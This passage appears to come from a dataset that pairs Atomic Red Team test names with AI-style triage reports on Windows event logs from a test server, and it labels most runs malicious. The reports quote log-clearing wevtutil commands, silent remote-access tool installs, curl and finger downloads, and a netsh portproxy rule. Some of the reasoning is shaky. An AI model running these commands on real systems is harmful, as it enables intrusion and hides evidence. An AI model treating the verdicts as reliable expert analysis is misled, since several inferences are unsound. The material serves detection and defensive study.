   - Multiple occurrences of the `wevtutil.exe` utility, including commands to clear (""cl"") event logs such as System, Security, Application, and Windows PowerShell logs. This is typically done to hide malicious activity traces.
   - Commands executed by the `admin_test` user, indicating potential misuse of administrative privileges.

2. **PowerShell Activity**:
   - The presence of PowerShell usage with potentially suspicious command lines, especially involving starting a process with the file path `Splashtop Remote\Server\SRServer.exe`. Splashtop can be used for legitimate remote access, but its unauthorized use can be a sign of remote access trojan (RAT) activity.

3. **Event Log Clearing**:
   - The Security log shows an entry with Event ID 1102, indicating that the security log has been cleared. This is a common tactic used by attackers to cover tracks.

4. **Use of Tools Like Whoami and Hostname**:
   - While the `hostname.exe` and `whoami.exe` tools can be used legitimately for system information gathering by administrators, their use in conjunction with the clearing of logs and PowerShell activity may suggest recon activity consistent with post-compromise behavior.

5. **High Integrity Levels**:
   - Execution of these tools at a high integrity level, indicating they are being run with elevated privileges.

### Assessment:

Given the use of administrative tools for potentially unauthorized purposes, the frequent clearing of system, security, and application logs, and the PowerShell activity that includes remote access software, there are significant indicators of possible compromise. The tactics observed align with techniques used by threat actors to establish persistence, cover tracks, and potentially exfiltrate data or further explore the compromised system.

### Conclusion:

- **Resolution**: **MALICIOUS**

### Guidance:

- **Immediate Actions**:
  1. Isolate the affected system from the network to prevent any potential spread of malicious activity.
  2. Conduct a thorough investigation to identify if additional systems have been affected.
  3. Review recent administrative activities and changes on the system and network, particularly focusing on the use of remote access tools.
  4. Analyze network logs for unusual connections, especially outward-bound traffic.
  5. Reset credentials associated with the `admin_test` account and any other potentially compromised accounts.
  
- **Preventive Measures**:
  1. Implement threat detection solutions to monitor and alert on similar malicious behaviors.
  2. Conduct regular security awareness training for users, emphasizing the risks of unauthorized software.
  3. Strengthen access controls and consider implementing multi-factor authentication.
  4. Regularly audit and review event logs and system security configurations.

This assessment indicates a high likelihood of unauthorized access and activity, suggesting an immediate response is necessary to mitigate further risk."
DNS Large Query Volume,"Upon reviewing the provided Windows event logs, several items of note arose, suggesting potential suspicious activity but not outright malicious behavior:

1. **Logon Events and Privileges:**
   - Multiple logon events with high integrity level and elevated privileges involving the user `admin_test` (SIDs ending with `-1006`). Notably, events indicate elevated privileges such as `SeDebugPrivilege` and others which are sensitive (Security event ID 4672 and 4624). It's common for legitimate administrative tasks, but it should be reviewed if this was expected.

2. **Event Log Clearing:**
   - The system logs (EventID 104) and security logs (EventID 1102) show that the Windows event logs were cleared by the user `admin_test`. Clearing logs can be normal during scheduled maintenance, but unauthorized clearing is a classic indicator of an attempt to cover tracks.

3. **PowerShell Activity:**
   - The PowerShell logs include an execution of a potentially investigation-oriented script using `Resolve-DnsName` within a loop that queries non-standard DNS TXT records (""atomicredteam"" mentioned in the script). This indicates an exploration or testing script rather than routine administrative activity, which could be related to security testing or reconnaissance. Such scripts can be used in adversary simulations or penetration testing exercises.

4. **Edge Update Events:**
   - Numerous entries related to `MicrosoftEdgeUpdate.exe`. While Windows updates are regular activities, excessive frequency or unexpected update paths, especially those involving temporary directories, should be scrutinized for possible tampering or unauthorized software being updated/installing under the guise of a legitimate process.

5. **System Time Changes:**
   - Discrepancies in system time adjustments within a very short span as recorded in the logs (Event ID 4616) could point towards attempts to change the audit trail timeline, although this alone is not conclusive evidence of malicious activity.

### Summary

Based on the log review:

- **Log Manipulation**: Evidence of log clearing can indicate potential cover-up, though more context on admin actions would clarify intent.
- **PowerShell Execution**: The command executed seems like part of a security assessment or a testing script.
- **Privilege and Logon Operations**: High privileges were used, somewhat standard for an admin account, but requires validation against expected behaviors.
  
### Resolution:

**SUSPICIOUS** – The combination of log clearing, PowerShell activity, and administrative-level operations suggest activities warrant further investigation. It is essential to confirm if these observations align with legitimate administrative tasks, security testing, or reconnaissance by authorized users, or if they indicate unauthorized activities. 

### Recommendations:

- Verify with IT/security teams if these actions were executed during internal security exercises or by authorized personnel.
- Audit the actions of `admin_test` around the timeframe and ensure all elevated privilege usage was intentional and within policy.
- Investigate why event logs were cleared and establish if this was conducted under proper change management processes.
- Monitor ongoing activities on the host for any further anomalies.
- Consider endpoint detection and response (EDR) solutions if not already in place for improved real-time visibility and alerting."
LogMeIn Files Detected Test on Windows,"Upon examining the provided Windows logs, several events and behaviors stand out as potentially indicative of malicious activity:

1. **Event Log Clearing:**
   - Multiple entries indicate that the `wevtutil.exe` command was used to clear various event logs (Security, System, Application, and Windows PowerShell) by the user `admin_test`. This is a significant indicator of potential malicious activity as attackers often clear logs to cover their tracks.

2. **Suspicious Command via PowerShell:**
   - The PowerShell logs reveal that the `Invoke-WebRequest` cmdlet was used to download a file named `LogMeInIgnition.msi` from an external URL (`https://secure.logmein.com/LogMeInIgnition.msi`). The subsequent use of `Start-Process` to silently install and run the downloaded MSI file is suspicious behavior. The command execution attempts to hide its activity through quiet and silent modes.

3. **Privilege Escalation:**
   - Event 4672 indicates that the user `admin_test` acquired several high-level privileges, including `SeDebugPrivilege` and `SeTcbPrivilege`, which are typically unnecessary for standard operations and could be abused for malicious purposes.

4. **Potential Backdoor Installation:**
   - The installation and execution of LogMeIn Ignition suggests the potential establishment of a remote access tool. This behavior, combined with the other indicators, suggests a risk of unauthorized remote access being set up.

5. **Network Services Manipulation:**
   - The Sysmon logs indicate startup entries and command line executions for several services, including WebClient, which were set to auto start. While this alone is not inherently malicious, in combination with the other suspicious activities, it raises concerns of potential service manipulation.

Given these observations, the activities outlined in the logs strongly suggest the possibility of malicious intent. The presence of script-based execution to download and execute a remote access tool, combined with log clearing and the acquisition of elevated privileges, points towards an attempt to maintain persistence and bypass detection.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected system from the network to prevent further potential unauthorized access.
- Conduct a thorough forensic investigation to understand the full extent of the compromise, including identifying any external connections or data exfiltration activities.
- Review and, if necessary, reset the credentials of the compromised user account (`admin_test`) and build a list of affected accounts/systems.
- Determine and eliminate the initial attack vector to prevent recurrence, and consider deploying endpoint threat detection and response tools to enhance ongoing monitoring.
- Finally, perform a detailed review and reassessment of security policies, especially regarding access controls and logging/reporting procedures, to mitigate against future incidents."
Splashtop Execution,"### Analysis of Windows Event Logs

Based on the detailed analysis of the provided event logs from the Windows machine, several activities are noteworthy and could potentially indicate malicious activity:

1. **Security Log Clearing**: 
   - The logs indicate that the security log was cleared (EventID 1102) by the user ""admin_test"". This is generally considered suspicious activity as clearing logs can be an attempt to cover tracks in an unauthorized or malicious action.
   
2. **System Log Cleared**: 
   - Events in the System log (EventID 104) show log clearing in the ""System"" and ""Windows PowerShell"" channels by the same user ""admin_test"". Log clearing in conjunction with other suspicious activities often suggests malicious intent.

3. **Unusual Process Execution**: 
   - Multiple PowerShell executions with elevated privileges are observed where PowerShell is used to start another executable ('strwinclt.exe'), a part of Splashtop, a remote desktop software. Execution of remote desktop utilities via PowerShell in such a manner often requires further inspection as it can be used for unauthorized remote access.

4. **Presence of Installers/Setups**: 
   - Installation-related entries for Splashtop and Microsoft Edge update are observed. While software updates are normal, their close proximity to log clearing and PowerShell usage could be indicators that these installations might be masking other activities.

5. **Sysmon Logs**: 
   - Multiple Sysmon logs indicate the execution of installers and PowerShell scripts which aligns with Splashtop, an application providing remote access. Given the context of other suspicious activities, these executions deserve scrutiny.

6. **Privilege Escalation Indicators**:
   - Processes executed under ""NT AUTHORITY\SYSTEM"" show high privilege operations. Large numbers of processes being executed under high privileges in a short timeframe might indicate a privilege escalation attempt.

### Assessment

The combination of security log clearing, system log clearing, usage of PowerShell to execute remote desktop utilities, and the subsequent close timing of these activities strongly align with behaviors often involved in stealthy or unauthorized actions on a system. This suggests a potential compromise where the intentions of the actor involved were possibly to gain remote access or exfiltrate data without detection.

### Final Resolution 
Based on the above indicators and suspicious activities observed in the logs, the assessment is concluded as:
- **MALICIOUS**

### Guidance 
1. **Immediate Actions**:
   - Isolate the affected machine (Server002) from the network to prevent any further unauthorized access or data exfiltration.
   - Conduct a thorough forensic analysis on the machine to identify all compromised elements and collect evidence.
   
2. **Follow-Up Actions**:
   - Review the administrative and other high-privilege accounts for unauthorized access or changes.
   - Ensure logging and monitoring configurations are secure and evidencing potential tampering.
   - Implement additional security controls to prevent similar incidents in the future, such as improved endpoint detection and response (EDR) capabilities.
   
3. **Long-Term Actions**:
   - Conduct a security audit across the network, focusing on access control, privilege escalation vulnerabilities, and unauthorized software installations.
   - Provide training to teams on recognizing and reacting to suspicious activities, particularly those involving log tampering and unauthorized access attempts."
DNS Regular Beaconing,"Upon analysis of the provided Windows event logs, several indicators suggest potential malicious activity. Here is a breakdown of the suspicious and potentially malicious activities observed:

### Windows PowerShell Logs

1. **Suspicious PowerShell Command Execution:**
   - The command being executed is a PowerShell script `T1071-dns-beacon.ps1` from the AtomicRedTeam repository. 
   - The script parameters indicate it is used for DNS-based Command and Control (C2) beaconing simulation to `127.0.0.1.nip.io` with intervals and jitter values set. 
   - While Atomic Red Team is known for testing security monitoring and defenses, the usage in a non-test environment without authorization could indicate malicious intent or unauthorized testing.

### System Logs

2. **Event Log Clearing:**
   - Multiple log files (System, Windows PowerShell, Security) were cleared by a user `admin_test`. 
   - Log clearing can be part of post-exploitation activities to cover tracks, which is a strong indicator of malicious behavior especially when combined with other suspicious activity.

### Sysmon Logs

3. **Execution of System Utilities in Quick Succession:**
   - Multiple system utilities (`whoami.exe`, `wevtutil.exe`, `conhost.exe`) are executed. 
   - `wevtutil.exe` is used to clear event logs which aligns with the System Log findings.
   - The high integrity level and sequence of these executions might indicate an attempt to disguise activity or maintain persistence.

### Security Logs

4. **Time Tampering:**
   - Time on the system was adjusted backward. This is often done to execute time-based security controls or event triggers at a manipulated time, which can help an attacker to evade detection or create confusion in log timelines.

### Assessment

The coordinated sequence of script executions, log clearance, and system utility usage strongly suggests potential exploitation activity. Given the use of a known tools repository like Atomic Red Team for potentially exploiting or testing defenses without indication of a legitimate testing scenario, along with steps to obscure such activity (log clearance and time manipulation), the risk level is heightened.

### Resolution

**MALICIOUS** - The events indicate deliberate attempts to execute potentially harmful scripts, clear logs post-execution, and modify timestamps, activities typically associated with malicious intent. Immediate containment and further investigation should be carried out to confirm unauthorized access, assess impact, and remediate any compromises."
Curl Download File,"Upon reviewing the provided Windows event logs for Server002, the following indicators of suspicious or potentially malicious activity have been identified:

1. **Event Clearing Activity**:
   - There are Security and System logs indicating that logs have been cleared by user ""admin_test"". Event IDs 104 and 1102 suggest intentional log clearing, which is often performed to cover tracks after potentially malicious activity. This action alone raises suspicion and should be further investigated.

2. **Time Manipulation**:
   - Security log Event ID 4616 shows evidence of system time changes. Time discrepancies are commonly employed by attackers to misalign timelines and evade detection by altering event time stamps.

3. **Usage of `wevtutil`**:
   - Multiple instances of `wevtutil.exe` execution are recorded in Sysmon logs, specifically with command lines that include ""cl"" which stands for clear logs. This utility is often used maliciously to delete logs covering tracks.

4. **Suspicious Command Execution**:
   - Sysmon log Event ID 1 shows `cmd.exe` launching `curl.exe` with a script that downloads a file (AllTheThingsx64.dll) from a GitHub repository associated with the Red Canary Atomic Red Team, a well-known threat emulation tool. This behavior can indicate activities related to penetration testing or simulated attacks, but if unauthorized, it’s a critical security concern.

Given these findings:

- **Indicators of Compromise (IOC)** – Log clearing, time manipulation, and suspicious command execution suggest potential malicious intent.
- **Threats/Risks** – If unauthorized, these activities risk compromising system integrity, confidentiality, or could facilitate further exploitation.

Based on the analysis of these logs, the activity contained within is clearly suspicious with strong indicators pointing towards malicious actions. Therefore, the recommended resolution for these logs is:

- **MALICIOUS**

**Guidance**:
- A thorough investigation should be performed to confirm the intent behind these actions.
- Verify whether the downloading and execution of the DLLs was an authorized security test or an unauthorized action.
- Investigate the user account ""admin_test"" and review access permissions and recent actions.
- Conduct a full security audit and consider monitoring for any further anomalous activities on Server002. Consider containment measures if more evidence of compromise exists."
Nimgrab - Transfer Files,"After a detailed analysis of the provided Windows event logs, particularly focusing on System log, Security log, and Sysmon log, we can observe several activities that indicate potential malicious behavior:

### Key Observations:

1. **Log Clearing Activity:**
   - Multiple instances of Windows event logs being cleared are observed:
     - System log cleared by `admin_test`: `EventID: 104`.
     - Security log cleared by `admin_test`: `EventID: 1102`.
     - Windows PowerShell log cleared by `admin_test`: `EventID: 104`.
   - The execution of `wevtutil.exe`, a utility for managing event logs, with the `cl` (clear) parameter further confirms the log clearing activity. This is a common tactic used by malicious actors to cover their tracks.

2. **Suspicious Process Execution:**
   - Execution of `wevtutil.exe` with command lines that suggest event log clearing (e.g., clearing logs for System, Application, Security, and PowerShell).
   - `cmd.exe` executing a command line to run `nimgrab.exe` from a suspicious location (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\nimgrab.exe`). The use of `cmd.exe /c` with potentially disguised paths to download and execute payloads is a common TTP (Tactics, Techniques, and Procedures) in malicious operations.

3. **Presence of Tools and Command Lines Often Used in Attacks:**
   - Nonspecific indication of `AtomicRedTeam`, which is a reference to atomic tests for threat detection. This could imply tests being run but also points towards evidence of attack framework usage if seen in out-of-context situations.

### Conclusion:

Based on the above observations, there are clear indications of suspicious activity, particularly with the clearing of multiple event logs, which is often linked to malicious attempts to erase evidence. The execution of scripts and potential payloads using command lines that download content from external sources suggests a high likelihood of malicious activity.

### Resolution:

**MALICIOUS** - The logs contain activities indicative of unauthorized log clearing and suspicious process execution that strongly suggest a compromise.

### Recommendations:

1. **Immediate Actions:**
   - Isolate the affected host (Server002) from the network to prevent further potential lateral movement or data exfiltration.
   - Conduct memory analysis and forensic imaging of the system for a thorough investigation.

2. **Further Investigation:**
   - Evaluate the `admin_test` account for unauthorized access or abnormalities.
   - Review network logs and firewall entries for anomalous outbound connections, especially to external IPs associated with the suspect activities.

3. **Preventive Measures:**
   - Implement logging and monitoring to detect similar activities in the future.
   - Apply group policies to restrict the usage of utilities like `wevtutil.exe` for non-administrative tasks unless explicitly allowed."
File download with finger.exe on Windows,"Upon analyzing the provided Windows event logs, several aspects emerge as suspicious or potentially indicative of malicious activity:

1. **Log File Clearing**: The repeated execution of the `wevtutil.exe` utility to clear various event logs (System, Security, Windows PowerShell) by the user `admin_test` suggests an attempt to cover tracks. Event 1102 in the Security log confirms log clearing by `admin_test`. This is a common tactic used by attackers to hide their activities.

2. **Excessive Privileges**: The user `admin_test` is associated with privileged events (EventID 4672) granting high-level privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others that are not typically required for regular administrative tasks, indicating potential abuse of privileges.

3. **Unusual Command Executions**: 
   - Multiple executions of command-line utilities like `whoami.exe`, `hostname.exe`, and `finger.exe` may indicate reconnaissance attempts to gather information about the system and its network.
   - Specifically, the command `cmd.exe /c finger base64_filedata@localhost` is highly indicative of suspicious activity as the `finger` command is rarely used in modern Windows environments, especially with encoded data, which could suggest data exfiltration attempts.

4. **NTLM Logon Events**: NTLM authentication entries (EventID 4624) from various IP addresses and machines like `DESKTOP-3HL5B2P` using the `admin_test` account (with high integrity level) demonstrate possible lateral movement within the network.

5. **Sysmon logs**: The presence of `conhost.exe` processes spawned from suspicious command-line utilities such as `wevtutil.exe` suggests possible interactive sessions and attempts to execute commands stealthily.

6. **Microsoft Edge Updates**: While multiple Sysmon events show the execution of EdgeUpdate processes, if these updates are unscheduled or unintended, they may represent a masquerade to run arbitrary code under the guise of legitimate processes.

Given these observations, there are several indicators of compromise, such as:
- Log file tampering to cover tracks.
- Execution of rarely used commands.
- Inappropriate privilege assignment.
- Potential lateral movement across the network.

**Resolution**: **MALICIOUS**

Given the combination of suspicious log clearing, high privilege assignments, and reconnaissance-like activities, this behavior merits classification as malicious. Immediate actions should include:
- Isolating the affected host.
- Conducting a comprehensive investigation to identify the extent of the compromise.
- Auditing access logs and user activities across the network.
- Reviewing user privileges and enforcing stricter controls, especially on accounts demonstrating unusual activities."
Steganographic Tarball Embedding,"Upon reviewing the Windows event logs provided, I have identified several aspects that require attention and analysis:

### Analysis of Logs:

1. **Frequent Execution of Microsoft Edge Installer (setup.exe):**
   - Multiple instances of `setup.exe` for Microsoft Edge are executed. These instances are executed with the `NT AUTHORITY\SYSTEM` user which has high-level privileges.
   - The frequent execution of `setup.exe` with various command-line options such as `--update-game-assist-package`, `--remove-deprecated-packages`, and `--register-package-identity` suggests that it could be related to an automated software update process.
   - These executions seem legitimate, as they pertain to Microsoft Edge updates and do not inherently suggest malicious activity.

2. **Execution of `wevtutil.exe` to Clear Logs:**
   - There are multiple instances where `wevtutil.exe` is executed with the command `cl` (clear) against various logs (Microsoft-Windows-Sysmon/Operational, Application, System, Security, and Windows PowerShell channels).
   - Clearing event logs can be a typical indication of malicious activity, as attackers often clear logs to cover their tracks.

3. **Execution of `PowerShell.exe` with Suspicious Script:**
   - A PowerShell script is executed which fetches content from a directory associated with `AtomicRedTeam`, which is known for testing and demonstrating adversarial techniques.
   - The use of PowerShell for file manipulation could be benign if it is part of a legitimate Red Team exercise for testing defenses. However, without explicit authorization or context, this activity could be deemed suspicious.

4. **Clearing of Event Logs by User `admin_test`:**
   - The user `SERVER002\admin_test` appears to clear the logs for System and Windows PowerShell, which coincides with the `wevtutil.exe` executions.
   - Event logs being cleared by a user with ""admin_test"" credentials may suggest either legitimate maintenance or malicious intent to hide activity.

### Indicators of Potential Compromise:

- **Log Clearing:** The act of clearing event logs (EventID 104 for System/Powershell, EventID 1102 for Security) is generally considered suspicious if not authorized, as it may imply an attempt to conceal actions.
  
- **PowerShell Activity:** The PowerShell usage involving the `AtomicRedTeam` folder could indicate a simulation of attack scenarios if conducted without proper authorization.

### Assessment:
- **SUSPICIOUS:** The clearing of event logs and unexplained PowerShell usage point towards potentially unauthorized activities. The context of `AtomicRedTeam` could imply testing, but this should be verified.
  
### Guidance:

- **Verify User Intent:** Confirm if the actions by `admin_test` involving PowerShell scripts and log clearing were authorized as part of a security test or update process.
  
- **Examine System for Other Indicators:** Investigate other systems for similar activities or signs of compromise to assess if there’s a broader threat.

- **Audit Security Controls:** Review access controls and event log policies to ensure proper usage and auditing, preventing unauthorized clearance of logs.

- **Engage in Further Investigation:** Consider conducting a deeper forensic analysis on the machine to uncover any other unauthorized changes or activities.

Given the evidence, further investigation is required to determine if the activities were part of a legitimate security exercise or unauthorized access."
MAZE Propagation Script,"The logs provided manifest a sequence of events that strongly indicate malicious activity on the Windows host. Here's a detailed analysis highlighting the suspicious findings:

### Analysis:
1. **Log Clearing Activity:**
   - The Security log (`EventID: 1102`) and the System log (`EventID: 104`) both show the event log clearing activity. The `LogFileCleared` entries by `admin_test` stand out as suspicious and are often indicative of cover-up operations post-compromise.
   - The clearing of logs, especially the Security and System logs, suggests that this action was performed to hide tracks, which is a common tactic used by attackers after malicious actions.

2. **Unusual Process Executions:**
   - `wevtutil.exe` is used to clear event logs multiple times within a few seconds. This utility is legitimate but its usage to clear logs without a genuine administrative need can indicate misuse.
   - The presence and use of PowerShell scripts from a temporary directory (e.g., AtomicRedTeam) with commands intended to copy files across machines and execute them could indicate a lateral movement or execution of payloads.

3. **Suspicious PowerShell Activity:**
   - The PowerShell log entries show the execution of a script intended to use `Test-Connection`, `cmd`, `copy`, and `wmic` to distribute and execute a file (`T1105.exe`) remotely using `regsvr32.exe`. This activity resembles a tactic of living-off-the-land (using legitimate admin tools for malicious tasks).
   - The operations using `PowerShell` to interact with other hosts on the network (`$machine_list`) to perform potentially unauthorized operations are suspicious and constitute a potential attack vector.

4. **Indicator of Compromise:**
   - The script present in the PowerShell logs combined with the presence of terms like ""AtomicRedTeam"" suggests the use of attack simulation frameworks, which points towards attempted TTPs (Techniques, Tactics, and Procedures) replication.

5. **High IntegrityLevel Processes:**
   - Many processes are listed with high integrity levels, typically indicative of escalated permissions, which, combined with suspicious activities, further corroborates potentially malicious intentions.

### Assessment:
Based on the above analysis, the activities captured in the logs suggest malicious intent, particularly due to the clearing of security logs, the use of PowerShell and wevtutil for actions that conceal activity, and attempts to potentially distribute and execute harmful binaries on networked systems.

### Resolution: MALICIOUS

### Guidance:
1. **Immediate Remediation:**
   - Immediately isolate Server002 from the network to prevent further potential compromise or lateral movements across the network.
   - Conduct a comprehensive malware scan on the server and all potentially affected systems.

2. **Thorough Investigation:**
   - Perform a deeper forensic analysis on Server002 to confirm the extent of compromise.
   - Evaluate all administrative accounts to detect any unauthorized creation or usage.

3. **Enhance Security Measures:**
   - Implement strict monitoring policies to detect and alert on event logs clearing and unusual PowerShell activities.
   - Review and tighten permissions for the use of administrative tools and PowerShell scripts.

4. **Review and Patch:**
   - Review security policies and update all systems regularly to patch vulnerabilities.
   - Educate users and administrators on recognizing phishing and social engineering exploits that could lead to such breaches.

These logs indicate an intrusion attempt or a script testing scenario using tools and methodologies typical of a Red Team operation gone unchecked. Address the vulnerabilities and entry points immediately to secure the environment."
Arbitrary file download using the Notepad++ GUP.exe binary,"### Detailed Analysis of Windows Event Logs

Upon reviewing the given Windows event logs, there are several indicators of potential malicious activity, primarily centered around log clearing and suspicious command execution. Below is a detailed analysis:

#### Indicators of Anomalous Behavior:

1. **Event Log Clearing:**
   - The Windows event logs contain multiple instances of logs being cleared, specifically within the System, Security, and Windows PowerShell channels. The logs show the use of `wevtutil.exe` for clearing logs, a legitimate command-line utility, which aligns with known tactics for hiding malicious activity.
   - The user responsible for the log clearance is ""admin_test"" across different channels, which suggests either this account was compromised, or an insider is involved.

   ```plaintext
   - System Log Cleared: EventID 104 by admin_test
   - PowerShell Log Cleared: EventID 104 by admin_test
   - Security Log Cleared: EventID 1102 by admin_test
   ```

2. **Suspicious Command-Line Execution:**
   - There is a command executed through `cmd.exe` to create directories and perform what appears to be a file download and extraction using `GUP.exe`. While there are legitimate uses for a command like this, given the context, it appears suspicious:
     
     ```plaintext
     CommandLine: ""... & GUP.exe -unzipTo \""\"" \""C:\\Temp\"" \""Sample https://getsamplefiles.com/download/zip/sample-2.zip
     ```

   - The tools used (GUP.exe) are sometimes utilized in penetration testing exercises (e.g., Atomic Red Team simulations), but without proper context or authorization, such actions can be indicators of compromise.

3. **Frequent Use of System Utilities:**
   - Multiple instances of `wevtutil.exe` usage are noted. These commands do not just clear the logs, but also specific channels, which is not typical behavior unless specifically needed for maintenance tasks. However, occurring simultaneously with other suspicious activities, this raises red flags.

#### Indicators of Malicious Activity:

- **Use of High-Level Privileges:**
  - The actions such as log clearing and file downloading via command-line are carried out with high-level system privileges. This could potentially indicate an attempt to carry out activities under elevated privileges to bypass security restrictions.

- **Attempt to Evade Detection:**
  - The clearing of logs, especially the Security logs, is a strong indicator of malicious intent, indicating the user's attempt to erase footprints or hide unauthorized changes/activities.

### Assessment and Resolution

Based on the review of these logs, I would categorize the situation as `MALICIOUS`. The combination of event log clearing, suspicious command-line activity, and the use of utilities typically leveraged for covering tracks, strongly indicates adversarial tactics possibly aimed at impairing detection and hiding malicious activity on the system.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - **Containment:** Isolate the concerned system (Server002) to prevent any lateral movement or further unauthorized access.
   - **Credentials Audit:** Review and potentially reset credentials associated with the ""admin_test"" user account.
   - **Security Audit:** Check for additional unauthorized activities and modifications across other systems.

2. **Forensic Analysis:**
   - Conduct a thorough forensic investigation on Server002, analyzing any potential malware infections or unauthorized changes.
   - Utilize system snapshots and memory forensics to trace any rootkit or persistent threats.

3. **Logging and Monitoring:**
   - Prioritize enhancing logs retention and protection to prevent future unauthorized clearing.
   - Implement improved monitoring solutions to alert on similar behavior patterns and account access anomalies.

4. **Communication and Reporting:**
   - Inform stakeholders and appropriate incident response teams about the potential breach.
   - Prepare a detailed incident report to encapsulate findings and strategize long-term improvements in security posture. 

By taking these immediate and strategic corrective actions, the risk of further malicious activity can be mitigated, and preventive measures can be reinforced."
ScreenConnect Application Download and Install on Windows,"Based on the provided logs, here is the detailed analysis:

**1. Unusual Behavior:**
- **PowerShell Execution:** There is evidence of PowerShell being used to download and install the ScreenConnect software from a URL (`https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi`). This action was automated with the use of `Invoke-WebRequest`, and `msiexec` was used to silently install the MSI package on the system.
  
- **Event Log Clearing:** The logs show that the application, system, powershell, and security event logs were cleared shortly after the execution of PowerShell commands, as indicated by `EventID 104` (Application/System) and `EventID 1102` (Security).

**2. Potential Malicious Activity:**
- **PowerShell Script:** The use of PowerShell to download and execute scripts, especially from cloudfront.net (a generic CDN service), can be a strong indicator of malicious activity, especially if this was unauthorized.
  
- **Log Clearing Actions:** The clearing of event logs is a common tactic used by malicious actors to cover their tracks and hinder investigation efforts. This activity was performed by a user account (`SERVER002\\admin_test`) with high integrity and admin privileges.

**3. Validation and Threat Assessment:**
- **ScreenConnect Installation:** While ScreenConnect is a legitimate remote desktop and meeting software, its installation without proper authorization could facilitate unauthorized remote control.
  
- **Log Clearing:** This activity is inherently suspicious and indicates an attempt to hide possibly malicious activities or unauthorized actions on the system.

**Assessment:**
- The combination of unauthorized PowerShell script usage for downloading and installing potentially unwanted software, coupled with subsequent event log clearing activities, suggests a fabrication of potential backdoor establishment on the host.

**Resolution: SUSPICIOUS**
- Although there is evidence of suspicious activity, the presence of legitimate tool usage (ScreenConnect) means further investigation is necessary to determine if this is an authorized action or misuse by an internal user or external threat actor.

**Next Steps:**
1. **Immediate Action:** Disconnect the system from the network if it’s still active to prevent further misuse or data exfiltration.
2. **Verification:** Confirm the legitimacy of the ScreenConnect installation with system administrators or IT support staff.
3. **Audit Logs:** Further examine audit logs and user permissions for any unauthorized access or modifications.
4. **Monitoring:** Increase monitoring on user accounts involved and any newly established connections.
5. **Incident Response:** Initiate a thorough incident response process to identify the full extent of potential compromise and implement remediation measures."
Lolbas replace.exe use to copy file,"Upon analyzing the provided Windows event logs, several events stand out that could potentially indicate malicious activity or at least warrant further investigation:

1. **Frequent invocation of PowerShell and utility tools**: There are multiple instances of processes like `powershell.exe`, `wevtutil.exe`, and `cmd.exe` being executed in a short span of time. PowerShell, in particular, is often leveraged by attackers for executing scripts, navigating the file system, and clearing logs.

2. **Event Log Clearing**: The `Security` log shows an Event ID 1102, which is indicative of the event log being cleared. Similarly, the `System` log has multiple Event ID 104 entries showing the System and PowerShell logs being cleared. Log clearing is a tactic used by attackers to cover their tracks after performing malicious activities.

3. **Use of `wevtutil` for clearing logs**: The command line usage of `wevtutil.exe` to clear logs (indicated by `cl` in the command line arguments) suggests an attempt to remove traces from multiple event channels, including `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`. This is highly suspicious activity generally associated with advanced persistent threats (APT) or when an attacker is trying to erase evidence of their activity.

4. **High Integrity Level Processes**: The logs show processes running with a high integrity level, executed by the user `admin_test`. This user account is involved in log-clearing activities, which suggests it has elevated privileges or administrative access, consistent with accounts targeted or used by attackers to hide their activities.

5. **Presence of Atomic Red Team Indicators**: The exact command found in the `cmd.exe` execution references `AtomicRedTeam`, which is a known open-source library of techniques tested against systems for security testing. This could indicate either a red team exercise, a penetration test, or an anomaly in true attack scenarios if not properly authorized or expected.

### Assessment and Recommendation:

- **Resolution**: **MALICIOUS**
  - The combination of event log clearing activities, especially across multiple channels, using `wevtutil` and other system commands, along with the presence of tools or scripts executed in a fashion typical of simulations of attack techniques or potentially unauthorized testing, indicates training or simulation of an attack.
  
- **Recommendations**:
  - **Immediate Incident Response**: Initiate a comprehensive incident response process to analyze the extent of potentially malicious activity.
  - **User and System Audit**: Audit recent actions for the account `admin_test`, scrutinizing recent privilege escalations, configurations, or access permissions granted or modified.
  - **Verify Red Team Exercises**: Ensure that the activity associated with `AtomicRedTeam` is documented, authorized, and expected. If it is unexpected, further scrutiny and investigation may be necessary.
  - **Secure and Review Logs**: Implement log forwarding and monitoring solutions to ensure that event logs are redundantly stored and analyzed in real-time, mitigating risks associated with local log tampering.
  - **Enhance Security Controls**: Review administrative privileges and security policies related to PowerShell and command-line utility executions to patch potential vulnerabilities exploited by attackers."
portproxy reg key,"Upon reviewing the provided Windows event logs, there are several points of concern indicating potential malicious activity. Here’s the detailed analysis:

### 1. PowerShell Execution:
- **PowerShell Commands**: The logs reveal PowerShell command executions involving `netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1`. This command sets up port forwarding, which can be utilized by attackers to create reverse tunnels or backdoors.
- **Indicator**: Use of the `&` operator to hide subsequent commands in `powershell.exe` suggests an obfuscation attempt, often associated with malicious intent.

### 2. Sysmon Logs:
- **Process Creation Events (Sysmon EventID 1)**: There are multiple executions of system utilities like `wevtutil.exe` and `conhost.exe` in a short timeframe. Notably, `wevtutil.exe` is used to clear specific Windows Event logs (`Application`, `System`, `Security`), which is a common tactic to cover tracks post-compromise.
- **Command Line Usage**: The usage of `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`, `""C:\\Windows\\system32\\wevtutil.exe"" cl System`, and `""C:\\Windows\\system32\\wevtutil.exe"" cl Security` suggests deliberate clearing of event logs, pointing to attempts to hide activity.

### 3. Security and System Event Logs:
- **Log Cleared Events (EventID 1102 in Security, EventID 104 in System)**: The logs were cleared by a user `admin_test`. This activity typically indicates an attempt to remove traces of prior actions and is a significant red flag in security investigations.

### 4. Suspicious Timing and Patterns:
- The sequence and timing of the events suggest a structured sequence of executing and clearing logs, indicative of a nefarious script or manual operation rather than an accidental or benign sequence.

### Conclusion:
The combination of PowerShell command execution to set port forwarding, the clearing of key Windows logs, and the orchestration of these tasks suggest the presence of malicious activity or an active threat actor within the environment.

**Resolution: MALICIOUS** - The observed indicators strongly suggest malicious activity, specifically an attempt to create persistence through port forwarding and efforts to cover tracks by clearing logs. Immediate investigation is warranted to identify the source of the compromise, disable potential backdoors, prevent further unauthorized access, and implement stronger security monitoring.

**Next Steps**:
1. **Immediate Containment**: Disconnect the affected host from the network.
2. **Thorough Investigation**: Conduct a comprehensive forensic analysis to determine the extent of the compromise.
